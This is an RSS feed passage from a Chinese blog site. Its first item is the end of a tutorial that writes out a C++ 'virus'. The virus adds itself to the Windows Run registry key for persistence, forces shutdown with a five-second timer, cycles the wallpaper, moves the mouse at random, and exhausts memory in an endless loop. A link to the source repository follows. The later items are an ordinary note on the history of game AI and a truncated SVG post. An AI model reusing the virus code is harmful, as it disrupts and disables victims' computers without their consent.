&lt;p&gt;&lt;strong&gt;phkResult&lt;/strong&gt;&lt;br/&gt;这是一个返回值，指向一个变量的指针，用来接受创建或打开的表项的句柄。当不再需要此返回的注册表项句柄时，调用RegCloseKey函数关闭这个句柄。&lt;/p&gt;
&lt;h3 id=&quot;regsetvalueex&quot;&gt;RegSetValueEx&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;// 读写注册表
LONG RegSetValueEx(
    HKEY hKey,
    LPCTSTR lpValueName,
    DWORD Reserved,
    DWORD dwType,
    CONST BYTE *lpData,
    DWORD cbData
);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;hKey&lt;/strong&gt;&lt;br/&gt;一个已打开项的句柄，或指定一个标准项名&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;lpValueName&lt;/strong&gt;&lt;br/&gt;指向一个字符串的指针，该字符串包含了欲设置值的名称。若拥有该值名称的值并不存在于指定的注册表项中，则此函数将其加入到该项。如果此值是NULL，或指向空字符串，则此函数为该项的默认值或未命名值设置类型和数据。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Reserved&lt;/strong&gt;&lt;br/&gt;保留值，必须强制为0&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;dwType&lt;/strong&gt;&lt;br/&gt;指定将被存储的数据类型，该参数可以为&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;REG_BINARY 任何形式的二进制数据
REG_DWORD 一个32位的数字
REG_DWORD_LITTLE_ENDIAN 一个“低字节在前”格式的32位数字
REG_DWORD_BIG_ENDIAN 一个“高字节在前”格式的32位数字
REG_EXPAND_SZ 一个以0结尾的字符串，该字符串包含对环境变量（如“%PAHT”）的未扩展引用
REG_LINK 一个Unicode格式的带符号链接
REG_MULTI_SZ 一个以0结尾的字符串数组，该数组以连接两个0为终止符
REG_NONE 未定义值类型
REG_RESOURCE_LIST 一个设备驱动器资源列表
REG_SZ 一个以0结尾的字符串&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;lpData&lt;/strong&gt;&lt;br/&gt;指向一个缓冲区，该缓冲区包含了欲为指定值名称存储的数据。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;cbData&lt;/strong&gt;&lt;br/&gt;指定由lpData参数所指向的数据的大小，单位是字节。&lt;/p&gt;
&lt;h2 id=&quot;关机方法&quot;&gt;1.4 关机方法&lt;/h2&gt;
&lt;p&gt;Windows 系统自带一个名为Shutdown.exe的程序，可以用于关机操作（位置在Windows\System32下），一般情况下Windows系统的关机都可以通过调用程序 shutdown.exe来实现的，同时该程序也可以用于终止正在计划中的关机操作。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;shutdown-a　取消关机
shutdown -s 关机
shutdown -f　强行关闭应用程序
shutdown -m \\计算机名　控制远程计算机
shutdown -i　显示“远程关机”图形用户界面，但必须是Shutdown的第一个参数 　
shutdown -l　注销当前用户
shutdown -r　关机并重启
shutdown -s -t 时间　设置关机倒计时
shutdown -h 休眠

 &lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;修改桌面背景代码&quot;&gt;2.1 修改桌面背景代码&lt;/h2&gt;
&lt;p&gt;图片信息使用了一个PVOID数组，并通过一个for循环不断切换桌面背景。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;windows.h&amp;gt;
#include&amp;lt;iostream&amp;gt;
#include &amp;lt;tchar.h&amp;gt;
#include&amp;lt;cstdlib&amp;gt;
#include&amp;lt;ctime&amp;gt;
using namespace std ;

int main(){
   PVOID s[10] = {
        (PVOID)&quot;D:\\windows\\system32\\bin\\background.jpg&quot; ,
        (PVOID)&quot;D:\\windows\\system32\\bin\\background1.jpg&quot; ,
         ...
        (PVOID)&quot;D:\\windows\\system32\\bin\\background6.jpg&quot; ,
        (PVOID)&quot;D:\\windows\\system32\\bin\\background7.jpg&quot; ,
        (PVOID)&quot;D:\\windows\\system32\\bin\\background8.jpg&quot; ,
        (PVOID)&quot;D:\\windows\\system32\\bin\\background9.jpg&quot;
        };
    SystemParametersInfo(20, true,s, 1) ;
    for(int i=0;i&amp;lt;10;i++){
        SystemParametersInfo(20, true,s[i], 1) ;
        Sleep(1000);//控制时间间隔
    }

    return 0 ;  
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;控制鼠标代码&quot;&gt;2.2 控制鼠标代码&lt;/h2&gt;
&lt;p&gt;利用随机数和while死循环达到鼠标不受控制疯狂随机移动的功能。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;windows.h&amp;gt;
#include&amp;lt;iostream&amp;gt;
#include &amp;lt;tchar.h&amp;gt;
#include&amp;lt;cstdlib&amp;gt;
#include&amp;lt;ctime&amp;gt;
using namespace std ;

int main(){
    POINT sb;
    srand((unsigned)time(NULL));
    GetCursorPos (&amp;amp;sb);//获取鼠标坐标
    while(1){
        SetCursorPos(rand()%1000,rand()%800);//更改鼠标坐标
        Sleep(1);//控制移动时间间隔
    }
    return 0 ;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;开机自启动代码&quot;&gt;2.3 开机自启动代码&lt;/h2&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;ret = RegSetValueEx(hkey,_T(&quot;新加项名称&quot;),0,REG_SZ,(const BYTE*)(&quot;d:\windows\setup.exe&quot;),21);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;第二个参数是项名称，第五个参数是要开机启动程序的路径位置，最后一个参数是第五个参数路径字符长度。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;windows.h&amp;gt;
#include&amp;lt;iostream&amp;gt;
#include &amp;lt;tchar.h&amp;gt;
#include&amp;lt;cstdlib&amp;gt;
#include&amp;lt;ctime&amp;gt;
using namespace std ;

int main(){
    HKEY hkey ;//计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    TCHAR p[64] ;
    long ret;
    ret = RegCreateKey(HKEY_CURRENT_USER,_T(&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;),&amp;amp;hkey);
    if(ret==ERROR_SUCCESS){
        ret = RegSetValueEx(hkey,_T(&quot;新加项名称&quot;),0,REG_SZ,(const BYTE*)(&quot;d:\\windows\\setup.exe&quot;),21);  // 主
        if(ret==ERROR_SUCCESS){
            // 写入成功
        }else {
            // 写入失败
            cout &amp;lt;&amp;lt; &quot;Write filed !&quot; ;
        }
    }else {
        // 注册表打开失败
        cout &amp;lt;&amp;lt; &quot;Read error !&quot; &amp;lt;&amp;lt; endl ;
    }    
    return 0 ;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;关机代码&quot;&gt;2.4 关机代码&lt;/h2&gt;
&lt;p&gt;这个功能实现比较简单。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;windows.h&amp;gt;

int main(){
    // 五秒关机
    system(&quot;shutdown -s -t 5&quot;);

    return 0 ;
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;注册程序将病毒主体加入开机自启动&quot;&gt;3.1 注册程序，将病毒主体加入开机自启动&lt;/h2&gt;
&lt;pre&gt;
&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;windows.h&amp;gt;
#include&amp;lt;iostream&amp;gt;
#include &amp;lt;tchar.h&amp;gt;
#include&amp;lt;cstdlib&amp;gt;
#include&amp;lt;ctime&amp;gt;
using namespace std ;

int main(){
    HKEY hkey ;//计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    TCHAR p[64] ;
    long ret;
    ret = RegCreateKey(HKEY_CURRENT_USER,_T(&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;),&amp;amp;hkey);
    if(ret==ERROR_SUCCESS){
        ret = RegSetValueEx(hkey,_T(&quot;LexBer&quot;),0,REG_SZ,(const BYTE*)(&quot;d:\\windows\\setup.exe&quot;),21);  // 主
        ret = RegSetValueEx(hkey,_T(&quot;Begin&quot;),0,REG_SZ,(const BYTE*)(&quot;d:\\windows\\system32\\bin\\begin.exe&quot;),35); // 主要动作
        ret = RegSetValueEx(hkey,_T(&quot;FindQQ&quot;),0,REG_SZ,(const BYTE*)(&quot;d:\\windows\\system32\\conf\\find.exe&quot;),35);//监控实时变化
        if(ret==ERROR_SUCCESS){
            // 写入成功
        }else {
            // 写入失败
            cout &amp;lt;&amp;lt; &quot;Write filed !&quot; ;
        }
    }else {
        cout &amp;lt;&amp;lt; &quot;Read error !&quot; &amp;lt;&amp;lt; endl ;
    }

    return 0 ;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;病毒主体在上方代码实现开机自启动之后这段代码可以不断修改壁纸控制鼠标以及关机&quot;&gt;3.2 病毒主体，在上方代码实现开机自启动之后，这段代码可以不断修改壁纸，控制鼠标以及关机。&lt;/h2&gt;
&lt;pre&gt;
&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;windows.h&amp;gt;
#include&amp;lt;iostream&amp;gt;
#include &amp;lt;tchar.h&amp;gt;
#include&amp;lt;cstdlib&amp;gt;
#include&amp;lt;ctime&amp;gt;
using namespace std ;

int main(){

    POINT sb;
    PVOID s[10] = {
        (PVOID)&quot;D:\\windows\\system32\\bin\\background.jpg&quot; ,
        (PVOID)&quot;D:\\windows\\system32\\bin\\background1.jpg&quot; ,
        (PVOID)&quot;D:\\windows\\system32\\bin\\background2.jpg&quot; ,
        (PVOID)&quot;D:\\windows\\system32\\bin\\background3.jpg&quot; ,
        (PVOID)&quot;D:\\windows\\system32\\bin\\background4.jpg&quot; ,
        (PVOID)&quot;D:\\windows\\system32\\bin\\background5.jpg&quot; ,
        (PVOID)&quot;D:\\windows\\system32\\bin\\background6.jpg&quot; ,
        (PVOID)&quot;D:\\windows\\system32\\bin\\background7.jpg&quot; ,
        (PVOID)&quot;D:\\windows\\system32\\bin\\background8.jpg&quot; ,
        (PVOID)&quot;D:\\windows\\system32\\bin\\background9.jpg&quot;
        };
    srand((unsigned)time(NULL));
    system(&quot;shutdown -s -t 5&quot;);
    SystemParametersInfo(20, true,s, 1) ;
    GetCursorPos (&amp;amp;sb);//获取鼠标坐标
    int i = 0 ;
    while(1){
        int *p = (int*)malloc(10000000000) ;
        printf(&quot;\a&quot;);
        SystemParametersInfo(20, true,s[i], 1) ;
        if(i&amp;gt;=9){
            i = 0 ;
        }
        SetCursorPos(rand()%1000,rand()%800);//更改鼠标坐标
        Sleep(1);//控制移动时间间隔
    }

    return 0 ;
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h3 id=&quot;github地址-github&quot;&gt;Github地址 : &lt;a href=&quot;https://github.com/CasterWx/c-cPlusPlus-Virus&quot;&gt;Github&lt;/a&gt;&lt;/h3&gt;
</description>
<pubDate>Tue, 07 Aug 2018 05:39:00 +0000</pubDate>
<dc:creator>AntzUhl</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/LexMoon/p/Virus.html</dc:identifier>
</item>
<item>
<title>游戏人工智能 读书笔记 （二） 游戏人工智能简史 - 腾讯WeTest</title>
<link>http://www.cnblogs.com/wetest/p/9436452.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wetest/p/9436452.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;WeTest 导读&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;从历史来看，在很长的时间里，创造一个可以代替人类玩游戏的机器人是唯一的在游戏中应用人工智能的方式。而在人工智能发展的早期，绝大部分游戏AI的研究者都在努力做出一个很牛的AI在棋类游戏中战胜人类。这里面一部分的原因是，棋类游戏蕴含着一些人类智能的基本因素。&lt;/p&gt;

&lt;hr/&gt;
&lt;p&gt;大部分的棋类游戏的规则都很简单，但是在方寸的棋盘之内，七百年来无数的人类天才都期望找到最优的解法。因此一个可以战胜顶尖的棋手的AI足以成为人工智能的圣杯。人工智能专家寻找棋类AI的历史可以上溯到阿兰-图灵(Alan Turing)和克劳德-香农（Claude Shannon）的时代。在最早的时候，图灵和香农就尝试使用Minimax 算法来让AI下棋，强化学习+自我对弈也很快被Arthur Samuel应用到跳棋(Checker)中(1959年）。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/992994/201808/992994-20180807131550500-2093197228.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;克劳德-香农&lt;/p&gt;

&lt;p&gt;棋类AI的发展中的一些里程碑(Milestone)如下：&lt;/p&gt;
&lt;p&gt;1952年，A.S. Douglas 开发了第一个 井字棋（Tic-Tac-Toe)游戏&lt;/p&gt;
&lt;p&gt;1992年，基于神经网络和temporal difference来进行自我对弈训练的西洋双陆棋（又称 十五子棋）的AI &quot;TD-Gammon&quot; 就达到了人类的顶尖水平。这个AI对于领域外的人来说可能意义不大，但是对于人工智能技术来说，是很重要的一步，其中用到的很多技术也在后续的AI，如Alphago中得到应用。&lt;/p&gt;
&lt;p&gt;1994年，Chinook跳棋AI在跳棋世界锦标赛上战胜了世界冠军；到了2007年，跳棋游戏的最优解也被找到了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/992994/201808/992994-20180807131614589-789072989.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Kasparov V.S. Deepblue&lt;/p&gt;

&lt;p&gt;1997年，IBM的深蓝在一个令人瞩目的比赛中战胜了当时的国际象棋特级大师 Garry Kasparov。深蓝是基于一个经过大量的国际象棋规则修正和棋盘评估修正后的极大极小算法来下棋的，并且是运行在一台定制的超级计算机上。从人工智能研究的角度来说，可能在圈内没有其在世界上对普通人的冲击来的大。最主要的原因是，在当时的人们看来，国际象棋在某种程度上象征着人类智慧的最高等级。当然，人们不久就将这一荣誉放到围棋上面了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/992994/201808/992994-20180807131637884-2039220558.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Alphago 和 李世石 注定载入史册的5番棋&lt;/p&gt;

&lt;p&gt;然后&lt;strong&gt;到了2016年，Google的DeepMind开发的Alphago在5番棋中战胜了韩国的李世石，这也标记着，围棋也从代表着人类独有的智慧的荣光的神坛上走了下来。&lt;/strong&gt;而历史的车轮在此刻也在逐渐的加快，第二年，中国的柯洁也在3番棋上输给了升级版的AlphaGo, 而后面DeepMind也迅速的发布了AlphaGo Zero 和 AlphaZero, 基于深度强化学习+MCTS+自我对弈的方式，完全抛弃人类知识，只从棋类的规则出发，不单在围棋上，在国际象棋和将棋上也同样达到了世界最强的水平。因此，一时之间，各种机器狗横行天下。而这一情况，随着Facebook开源了ELF的基于AlphaZero的围棋算法之后会更加的严重。&lt;/p&gt;


&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/992994/201808/992994-20180807131704070-1589301170.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;战胜职业棋手，只需一块GPU&lt;/p&gt;

&lt;p&gt;除了棋类游戏之外，牌类游戏也是游戏AI关注的一个焦点。相比于棋类这样的完全信息博弈游戏，牌类这样的非完全信息博弈游戏在本书中的关注不多。一方面来说，牌类游戏有一定的运气因素，同时还牵扯到和对手的博弈，不完全是计算智能所关注的方向，更多的可能要和博弈论相结合。但是最近学术界在两人无限注的德州扑克上取得的突破性进展，还是值得关注的。目前德州AI Libratus是一套完全和围棋不一样的算法，它是基于反事实遗憾最小化（Counter Factual Regret Minimization）的算法来寻找两人博弈的一个纳什均衡点。但是在多人博弈的问题上，例如麻将，多人德州，并没有这样的一个纳什均衡，因此目前还没有比较好的算法。去年的时候，Libratus之父Prof. Sandholm来腾讯演讲的时候就曾表示，目前不会投入精力来做多人的德州AI。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/992994/201808/992994-20180807131721964-158484557.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Tuomas Sandholm: 德州AI Libratus的创造者&lt;/p&gt;

&lt;p&gt;另一方面，和人工智能发展早期学术界的研究者一门心思的来搞棋类AI相比，游戏业界通常要更现实一些，干活的时候，不管怎么样先搞上线再说。和学术界关注理论上的突破相比，业界会更注重工程方面，不管是多low的算法，好用就行。这也让早期人工智能技术和游戏的结合主要是由业界引领。而他们也关注的领域也会窄一些，大部分的精力都投入到：游戏中的NPC要怎么用算法控制中去，但也有一些使用程序生成内容的尝试。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/992994/201808/992994-20180807131747400-1678249602.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; Halo 2&lt;/p&gt;

&lt;p&gt;在最早的时候，受限于硬件设备和AI的能力，大部分的NPC行为都是基于简单的规则来进行控制的。直到微软在2001年推出光晕(Halo), 才让行为树成为大部分游戏控制NPC行为的标配。但游戏开发者一直致力于提高NPC行为的合理性，从而提升玩家在游戏中沉浸感。而在游戏设计的时候，游戏的开发者需要考虑到人工智能技术的限制，用某种方式避免人工智能算法产生”灾难性”的后果，这里面一个经典的例子就是 文明(Civilization)中扔核弹的甘地。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/992994/201808/992994-20180807131821066-96454409.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;疯狂的甘地&lt;/p&gt;

&lt;blockquote readability=&quot;20&quot;&gt;
&lt;p&gt;&lt;strong&gt;文明2有一个有趣的bug：疯狂的甘地。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;早期玩家都知道，印度文明一出现在视野里，必须立刻毫不迟疑地卧薪尝胆跟其他文明媾合、集中全部力量无论多么遥远，也要把印度早早摁死。无论怎样诱人的和平条约，都不要和印度签署，一定要跟甘地（印度的领袖）死磕到底。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;否则，一旦印度发展出核武器，就会疯狂地四处乱炸，把全地球彻底搞当。相比之下，鑫十五天简直是个乖宝宝。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原因很简单。游戏设定里甘地是非常和平的，其野蛮度极低。文明发展，野蛮度越来越低，等到原子弹出现的时代，就差不多降到零。降到零是小事，一旦降为负数，程序无法处理负号，于是变成255，极大值。这是比希特勒还疯狂好多倍的数值。于是一个极端和平的甘地，眨眼成了核弹狂魔。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;回答来源自知乎用户：齐遨&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;事实上，大部分的游戏大作都某种程度上结合了一定的人工智能技术，以期让游戏内NPC的行为可以自适应于不同的玩家(V社(Valve)的半条命，世嘉的异形），或者可以自动化的生成游戏中的某些场景（模拟人生系列，文明系列，暗黑破坏神系列）。&lt;/p&gt;
&lt;p&gt;另一个游戏业界比较关注的方面是了解游戏中的玩家。这个在最初的时候是更偏重于数据挖掘的，09年的时候Zynga就通过一些数据挖掘技术来分析游戏中不间断收集来的数据，从而可以半自动的更新其在Facebook 上的农场游戏(FarmVille)游戏以适应玩家需求。到了18年的今天，相信各个游戏公司内都会有或大或小的数据分析团队。现在业界大部分都还是基于玩家在游戏外部的一些数据来做数据分析和数据挖掘。不过现在也有一些公司希望通过AI技术来分析玩家在游戏内的行为来更好的对玩家建模。不过这上面也会有一些争议，比如EA提交的“动态难度调整”论文就通过记录玩家在线游戏的方式，包括你的游戏技巧，进攻性，以及游戏瓶颈期（也就是难度时间）来自动为你匹配合适的对手，让你的游戏体验更为平滑，但一方面也是在鼓励你氪金。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/992994/201808/992994-20180807131927792-199243824.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;EA发布的引起争议论文&lt;/p&gt;

&lt;p&gt;近些年来，学术界也开始投入越来越多的精力在视频游戏上面。不过学术界还是更希望能够开发出一个AI可以在视频游戏中也超过人类最高的水平。在视频游戏AI人工智能中一个重要的里程碑是由谷歌的Deepmind在2014年达成的。Deepmind开发的程序以游戏的原始图像作为输入，学会了经典的雅达利(Atari) 2600游戏主机中的一些游戏，并超过人类的最高得分。目前Deepmind和其他的一些团队应该投入了很多精力在研究星际争霸AI，而OpenAI也在研究Dota中的AI。不过目前还没有像围棋一样的突破出现, 只是有一些API提供出来供研究人员去使用。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/992994/201808/992994-20180807131944641-160401742.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Deepmind 提供的星际2的建模方式&lt;/p&gt;

&lt;p&gt;所以，可以明显看到，学术界和工业界对于游戏人工智能的研究方向是有一定的区别的。对于人工智能的学院派来说，人工智能是在游戏前面的，他们的目标是尽可能的应用人工智能和计算智能的技术来增强NPC的行为能力。但通常他们会关注在一些普遍意义上比较简单，面向研究，很难扩展的项目下，这些项目同时在商业上价值比较低。而游戏业界通常抱怨学术界缺乏领域知识和实践的经验，因此没法解决游戏制作过程中的真实问题和挑战。NPC的实时的自适应和学习就是一个很好的例子。对于学术界的研究者来说，创造一个可以通过和玩家以及其他NPC们进行交互来学习的NPC是令人兴奋的。但是，游戏开发者会担心这样会让这些NPC不按设计那样工作，于是很可能会”破坏整个游戏”。这个其实在聊天机器人上面就出现过教训。几乎所有的没有强规则约束的聊天机器人都被网友们玩坏了。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;另外，书中其实提了一个很有意思的观点：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当我们思考怎么在现在的视频游戏中应用人工智能的时候，很重要的是，我们要明白大多数的游戏类型都是从早期的游戏设计中慢慢发展而来的。举例说来，第一个平台游戏是80年代中期发行的，第一个第一人称射击游戏和实时战略游戏都是90年代早期发行的。在那个时代，在游戏中使用先进的人工智能技术的能力是远远不如现在的。所以游戏设计师只能在缺乏人工智能能力的情况下设计游戏。这些基本的设计模式大部分都被现在的游戏继承了。因此可以说，大部分的游戏其实在设计的时候都是不需要人工智能的。对于希望创造一个有趣的人工智能游戏角色的学术界研究者来说，最好的方式可能是设计一种新的从源头上就需要人工智能的游戏。&lt;/p&gt;

&lt;p&gt;不过虽然有分歧，乐观的看，其实学术界和工业界没必要用同样的一套方法去解决同样的问题。双方做的事情虽然有区别，还是其实还是可以互相之间带来新的方法和思路。一方面来说，NPC的拟人化还是有更多的提高空间的，比如说情感的捕捉和表达。这个也是学术界和工业界都关注的问题。当然还有一方面的观点是，其实现在NPC已经基本上在工程上被解决了，对于游戏来说，创造一个AI并不是一件困难的事情，可能双方需要更关注一些玩家建模和程序化生成内容的研究。整体上来看，学术界和工业界都是为了共同的目标互相共享实践经验和理论知识：最大程度的推进人工智能技术和改进游戏。&lt;/p&gt;

&lt;p&gt;最后，这本书不是关于游戏人工智能在工业界的实践。相反，它本质上是一本学院的教科书，因此要了解更多人工智能在游戏业界的应用情况，可以参考书中的介绍的《游戏人工智能编程智慧》系列。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;本文内容包含以下章节&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;Chapter 1.2  A Brief History of Artificial Intelligence and Games&lt;/p&gt;
&lt;p&gt;本书英文版： Artificial Intelligence and Games - A Springer Textbook&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;strong&gt;目前，腾讯WeTest重磅发布“深度兼容测试”服务，首次将AI能力落地测试行业。该服务整合了腾讯多年来在AI模拟自动化探索、AI结果检测与分析上累积的经验，将AI与自动化能力植入编写脚本的兼容测试流程中，大幅提升测试效率，降低70%的测试成本，为从业者良好解决“人员，设备，流程，工具，环境”五大适配兼容测试难题。&lt;/strong&gt;&lt;/p&gt;

&lt;p class=&quot;p&quot;&gt;&lt;strong&gt;点击：&lt;a href=&quot;http://wetest.qq.com/activities/welfare2018?from=content_cnblogs&quot;&gt;&lt;span&gt;http://wetest.qq.com/activities/welfare2018&lt;/span&gt;&lt;/a&gt;，即刻领取礼包。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果使用当中有任何疑问，欢迎联系腾讯WeTest企业QQ：2852350015&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 07 Aug 2018 05:22:00 +0000</pubDate>
<dc:creator>腾讯WeTest</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wetest/p/9436452.html</dc:identifier>
</item>
<item>
<title>SVG前戏—让你的View多姿多彩 - android 开发</title>
<link>http://www.cnblogs.com/gooder2-android/p/9436420.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/gooder2-android/p/9436420.html</guid>
<description>[unable to retrieve full-text content]什么是SVG SVG的全称是Scalable Vector Graphics，叫可缩放矢量图形。是一种基于可扩展标记语言（XML）。它和位图（Bitmap）相对，SVG不会像位图一样因为缩放而让图片质量下降。它的优点在于节约空间，使用方便。 svg的优点 首先简要解释一下矢量图像格式和位图图像格式的</description>
<pubDate>Tue, 07 Aug 2018 05:14:00 +0000</pubDate>
<dc:creator>android 开发</dc:creator>
<dc:identifier>http://www.cnblogs.com/gooder2-android/p/9436420.html</dc:identifier>
</item>
</channel>
</rss>